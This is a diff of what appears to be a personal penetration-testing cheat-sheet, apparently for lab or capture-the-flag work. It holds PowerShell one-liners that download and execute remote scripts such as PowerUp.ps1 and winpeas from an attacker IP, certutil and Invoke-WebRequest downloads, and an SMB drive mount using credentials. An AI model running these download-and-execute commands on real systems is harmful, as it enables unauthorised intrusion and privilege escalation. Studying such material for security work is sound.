@@ -65,9 +65,9 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 
 ## Powershell
 ```powershell
-Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/winpeas.bat')"
+Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/prettysafe.ps1')"
 
-IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/winpeas.bat')
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/PowerUp.ps1')
 
 Invoke-WebRequest -Uri 10.10.16.4/winpeas.bat -OutFile winpeas.bat
 
@@ -85,13 +85,14 @@ certutil -urlcache -f http://IP/FILE OUTPUTFILENAME
 
 ### copy
 
-![[SMB 443#SMB server]]
+![[SMB 443,139#SMB server]]
 ### connect smb windows powershell
+
 ```powershell
 
 
 $pass = convertto-securestring '1234' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential ('super', $pass)
+$cred = New-Object System.Management.Automation.PSCredential ('alfred', $SecPass)
 New-PSDrive -Name super -PSProvider FileSystem -Credential 
 $cred -Root \\10.10.17.185\super
 
